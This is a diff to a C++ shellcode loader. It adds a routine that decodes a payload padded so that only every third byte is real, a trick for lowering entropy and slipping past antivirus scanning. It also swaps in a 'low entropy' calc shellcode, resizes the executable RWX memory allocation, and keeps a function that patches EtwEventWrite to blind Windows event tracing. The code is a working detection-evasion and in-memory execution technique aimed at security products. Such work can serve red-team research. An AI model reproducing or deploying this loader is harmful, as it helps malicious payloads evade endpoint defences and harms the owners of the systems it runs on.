@@ -12,7 +12,22 @@ void my_xor(unsigned char data[], int size, const unsigned char key[], int key_s
 		data[i] = data[i] ^ key[i % key_size];
 	}
 }
-
+// This function will xor the payload with the key in order to decrypt it
+void decrypt_payload(unsigned char* payload, unsigned char* memory, unsigned int payload_size, const unsigned char xor_key)
+{
+    int j = 0;
+    for (unsigned int i = 0; i < payload_size-1; i+=3)
+    {
+        memory[j] = payload[i] ^ xor_key;
+        //std::cout <<  std::hex <<int(payload[i]);
+        j++;
+    }
+    /*
+    for (unsigned int i = 0; i < (payload_size-1)/3; i+=1){
+        std::cout <<  std::hex <<int(payload[i]);
+    }
+    */
+}
 // This function patches the EtwEventWrite function to avoid ETW events
 void patchEtw(char* ntdll_dll_obfuscated_function_name, char* EtwEventWrite_obfuscated_function_name)
 {
@@ -104,7 +119,7 @@ int main()
 #ifdef SHELLCODE_PATH
 #include SHELLCODE_PATH
 #else
-#include "../../src/shellcodes/xored_calc.hpp"
+#include "../../src/shellcodes/xored_low_entropy_calc.hpp"
 #endif
 
     // Step 1 : Calculate the largest prime number (before a specific number)
@@ -202,7 +217,7 @@ int main()
 
 	// Step 5 : Allocate the memory
 	void* memory = VirtualAlloc(nullptr,
-								sizeof(shellcode),
+								sizeof(shellcode)/3,
 								MEM_COMMIT,
 								PAGE_EXECUTE_READWRITE);
 
@@ -220,7 +235,7 @@ int main()
 	// Step 6 : Copy the encrypted shellcode to the allocated memory
 	memcpy(memory,
 		   shellcode,
-		   sizeof(shellcode));
+		   sizeof(shellcode)/3);
 
 #if DEBUG
 	printf("Shellcode copied to memory\n");
@@ -229,7 +244,9 @@ int main()
 #endif
 
 	// Step 7 : Decrypt the payload
-	my_xor((unsigned char*) memory, sizeof(shellcode), key, sizeof(key));
+	//my_xor((unsigned char*) memory, sizeof(shellcode), key, sizeof(key));
+    const unsigned char key = '\x54';
+    decrypt_payload((unsigned char*) shellcode, (unsigned char*) memory, sizeof(shellcode), key);
 #if DEBUG
 	printf("Shellcode decrypted\n");
 	printf("Hit enter to continue\n");
